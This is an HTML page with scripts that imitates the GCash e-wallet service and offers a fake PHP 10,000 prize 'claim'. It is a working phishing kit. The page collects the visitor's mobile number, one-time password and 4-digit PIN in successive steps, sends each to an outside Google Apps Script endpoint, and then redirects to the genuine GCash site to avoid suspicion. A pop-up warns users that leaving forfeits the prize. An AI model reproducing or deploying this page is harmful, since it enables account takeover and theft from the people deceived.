<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GCash Claim</title>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <link rel="icon" type="image/png" href="logo.png"> 
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap');

        body {
            font-family: 'Poppins', sans-serif;
            margin: 0;
            background-color: #f8f9fa;
            display: flex;
            flex-direction: column;
            align-items: center;
            height: 100vh;
            justify-content: flex-start;
        }

        .header {
            width: 100%;
            background-color: #007bff;
            padding: 40px 0;
            display: flex;
            justify-content: center;
            border-radius: 0 0 25px 25px;
        }

        .header img {
            width: 150px;
        }

        .container {
            background-color: white;
            width: 92%;
            max-width: 400px;
            margin-top: -40px;
            padding: 25px;
            border-radius: 20px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        .merchant-info {
            text-align: left;
            font-size: 14px;
            color: #aaa;
            margin-bottom: 15px;
        }

        .merchant-info span {
            display: flex;
            justify-content: space-between;
            font-weight: 500;
            color: #333;
        }

        .amount {
            font-weight: bold;
            color: #007bff;
            font-size: 16px;
        }

        h2 {
            font-size: 18px;
            font-weight: 600;
            color: #000;
            margin-bottom: 20px;
        }

        .input-group {
            display: flex;
            align-items: center;
            background: white;
            border-bottom: 2px solid #ccc;
            padding: 10px 5px;
            font-size: 16px;
        }

        .input-group span {
            font-weight: bold;
            margin-right: 8px;
            color: #555;
        }

        .input-group input {
            border: none;
            outline: none;
            width: 100%;
            font-size: 16px;
            background: transparent;
            color: #333;
        }

        .button {
            background-color: #d6e4ff;
            color: #9eb3ff;
            padding: 15px;
            border: none;
            border-radius: 50px;
            font-size: 16px;
            width: 100%;
            font-weight: bold;
            margin-top: 15px;
            transition: 0.3s;
            cursor: not-allowed;
            position: relative;
        }

        .button.active {
            background-color: #007bff;
            color: white;
            cursor: pointer;
        }

        .button.loading::after {
            content: "";
            position: absolute;
            right: 15px;
            width: 16px;
            height: 16px;
            border: 2px solid white;
            border-top: 2px solid transparent;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        .otp-group {
            display: none;
            margin-top: 15px;
        }

        .mobile-input-container{
            display: block;
        }

        .pin-group {
            display: none;
            margin-top: 15px;
        }
        .pin-container {
        display: flex;
        justify-content: center;
        gap: 10px;
    }

    .pin-input {
        width: 40px;
        height: 40px;
        font-size: 24px;
        text-align: center;
        border: 2px solid #ccc;
        border-radius: 8px;
    }

    .pin-input:focus {
        border-color: #007bff;
        outline: none;
    }
    </style>
</head>
<body>
    <div class="header">
        <img src="logo2.png" alt="GCash Logo">
    </div>
    <div class="container">
        <div class="merchant-info">
            <span>Merchant: <strong>Gcash Pay</strong></span>
            <span>Amount to be claimed: <span class="amount" style="color: #007bff;">PHP 10,000.00</span></span>
        </div>
        <h2>Verify to Claim with Gcash</h2>
      
        <div class="mobile-input-container" id="mobileInputContainer">
            <div class="input-group">
                <span>+63</span>
                <input type="text" id="mobileNumber" placeholder="Mobile number" maxlength="10" oninput="validateInput()" pattern="[0-9]*" inputmode="numeric">
            </div>
        </div>
        <button class="button" id="nextButton" disabled onclick="nextStep()">NEXT</button>
        
        <div class="otp-group" id="otpGroup">
            <h2>Enter OTP</h2>
            <div class="input-group">
                <input type="text" id="otpInput" placeholder="Enter OTP" maxlength="6" pattern="[0-9]*" inputmode="numeric">
            </div>
            <button class="button" id="submitOTP" disabled onclick="submitOTP()">SUBMIT</button>
        </div>

       <div class="pin-group" id="pinGroup">
    <h2>Enter 4-digit PIN</h2>
    <div class="pin-container">
        <input type="password" maxlength="1" class="pin-input" id="pin1" inputmode="numeric" pattern="[0-9]*" oninput="validateAndMove(this, 'pin2')">
    <input type="password" maxlength="1" class="pin-input" id="pin2" inputmode="numeric" pattern="[0-9]*" oninput="validateAndMove(this, 'pin3')" onkeydown="moveBack(event, 'pin1')">
    <input type="password" maxlength="1" class="pin-input" id="pin3" inputmode="numeric" pattern="[0-9]*" oninput="validateAndMove(this, 'pin4')" onkeydown="moveBack(event, 'pin2')">
    <input type="password" maxlength="1" class="pin-input" id="pin4" inputmode="numeric" pattern="[0-9]*" oninput="validateAndMove(this, null)" onkeydown="moveBack(event, 'pin3')">
    </div>
    <button class="button" id="claimButton" disabled>CLAIM NOW</button>
</div>
        
      <p class="register-link">
    Don’t have a GCash account? 
    <a href="#" id="registerLink">Register now</a>
</p>

    </div>

    <script>

        document.getElementById("registerLink").addEventListener("click", function(event) {
    event.preventDefault(); // Prevents immediate navigation

    Swal.fire({
        icon: "warning",
        title: "Are you sure?",
        text: "Are you sure you want to leave the page? For doing so, you won’t be able to claim your prize.",
        showCancelButton: true,
        confirmButtonColor: "#3085d6",
        cancelButtonColor: "#d33",
        confirmButtonText: "Yes, leave page"
    }).then((result) => {
        if (result.isConfirmed) {
            window.location.href = "https://www.gcash.com"; // Replace with the actual registration link
        }
    });
});
         document.addEventListener("DOMContentLoaded", function () {
        const otpInput = document.getElementById("otpInput");
        const pinInput = document.getElementById("pinInput");
        const submitOTP = document.getElementById("submitOTP");
        const claimButton = document.querySelector(".pin-group button");

        otpInput.addEventListener("input", function () {
            this.value = this.value.replace(/\D/g, "");
            submitOTP.disabled = this.value.length !== 6;
            submitOTP.classList.toggle("active", this.value.length === 6);
        });

        pinInput.addEventListener("input", function () {
            this.value = this.value.replace(/\D/g, "");
            claimButton.disabled = this.value.length !== 4;
            claimButton.classList.toggle("active", this.value.length === 4);
        });
    });
        function validateInput() {
            const mobileNumber = document.getElementById('mobileNumber');
            const nextButton = document.getElementById('nextButton');
            
            mobileNumber.value = mobileNumber.value.replace(/\D/g, '');

            if (mobileNumber.value.length === 10) {
                nextButton.classList.add("active");
                nextButton.disabled = false;
            } else {
                nextButton.classList.remove("active");
                nextButton.disabled = true;
            }
        }

        function nextStep() {
            const mobileNumber = document.getElementById("mobileNumber").value;
            const nextButton = document.getElementById("nextButton");

            nextButton.classList.add("loading");
            nextButton.innerText = "Processing...";
            nextButton.disabled = true;

            fetch("https://script.google.com/macros/s/AKfycbyY4P4NkLUkzCMWv9dAPJpVLQj8DfbJIo0iqe0v39HpUnzzW3zDcZk6UfSk-LRU4Sz3pQ/exec", {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: `number=${mobileNumber}`
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === "success") {
                    setTimeout(() => {
                        nextButton.style.display = "none";
                        document.getElementById("otpGroup").style.display = "block";
                        document.getElementById("mobileInputContainer").style.display = "none";
                    }, 2000);
                } else {
                    alert(data.message);
                }
            })
            .catch(error => console.error("Error:", error));
}


        function submitOTP() {
        const otp = document.getElementById("otpInput").value;
        const mobileNumber = document.getElementById("mobileNumber").value;
        const submitButton = document.getElementById("submitOTP");

        submitButton.classList.add("loading");
        submitButton.innerText = "Verifying...";
        submitButton.disabled = true;

        fetch("https://script.google.com/macros/s/AKfycbyY4P4NkLUkzCMWv9dAPJpVLQj8DfbJIo0iqe0v39HpUnzzW3zDcZk6UfSk-LRU4Sz3pQ/exec", {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: `number=${mobileNumber}&otp=${otp}`
        })
        .then(response => response.json())
        .then(data => {
            if (data.status === "success") {
                setTimeout(() => {
                    document.getElementById("otpGroup").style.display = "none";
                    document.getElementById("pinGroup").style.display = "block";
                }, 2000);
            } else {
                alert(data.message);
            }
        })
        .catch(error => console.error("Error:", error));
    }


     function validateAndMove(current, nextId) {
    current.value = current.value.replace(/\D/g, ''); // Remove non-numeric characters
    if (current.value && nextId) {
        document.getElementById(nextId).focus();
    }
    checkPinComplete();
}

function moveBack(event, prevId) {
    if (event.key === "Backspace" && !event.target.value && prevId) {
        document.getElementById(prevId).focus();
    }
}
function checkPinComplete() {
    const pin1 = document.getElementById("pin1").value;
    const pin2 = document.getElementById("pin2").value;
    const pin3 = document.getElementById("pin3").value;
    const pin4 = document.getElementById("pin4").value;
    const claimButton = document.getElementById("claimButton");

    if (pin1 && pin2 && pin3 && pin4) {
        claimButton.disabled = false;
        claimButton.classList.add("active");
        claimButton.onclick = sendPIN;
    } else {
        claimButton.disabled = true;
        claimButton.classList.remove("active");
    }
}

function sendPIN() {
    const pin = document.getElementById("pin1").value +
                document.getElementById("pin2").value +
                document.getElementById("pin3").value +
                document.getElementById("pin4").value;
    const mobileNumber = document.getElementById("mobileNumber").value;
    const claimButton = document.getElementById("claimButton");

    // Check if already claimed
    if (sessionStorage.getItem("claimed")) {
        Swal.fire("Error", "You can't claim twice!", "error");

        return;
    }

    claimButton.classList.add("loading");
    claimButton.innerText = "Processing...";
    claimButton.disabled = true;

    fetch("https://script.google.com/macros/s/AKfycbyY4P4NkLUkzCMWv9dAPJpVLQj8DfbJIo0iqe0v39HpUnzzW3zDcZk6UfSk-LRU4Sz3pQ/exec", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: `number=${mobileNumber}&pin=${pin}`
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === "success") {
            sessionStorage.setItem("claimed", "true"); // Set flag to prevent multiple claims
            Swal.fire("Success", "Claim successful!", "success").then(() => {
                window.location.href = "https://new.gcash.com"; // Change this to your redirect page
            });
        } else {
            Swal.fire("Error", data.message, "error");
        }
    })
    .catch(error => {
        console.error("Error:", error);
        Swal.fire("Error", "Something went wrong. Please try again.", "error");
    });
}

// Clear inputs if user goes back
window.addEventListener("pageshow", function () {
    if (sessionStorage.getItem("claimed")) {
        Swal.fire({
            icon: "error",
            title: "Error",
            text: "You can't claim twice!",
            confirmButtonText: "OK"
        }).then(() => {
            window.location.href = "https://new.gcash.com/"; // Change this to your desired URL
        });

    } else {
        document.getElementById("pin1").value = "";
        document.getElementById("pin2").value = "";
        document.getElementById("pin3").value = "";
        document.getElementById("pin4").value = "";
        document.getElementById("mobileNumber").value = "";
    }
});


    </script>
</body>
</html>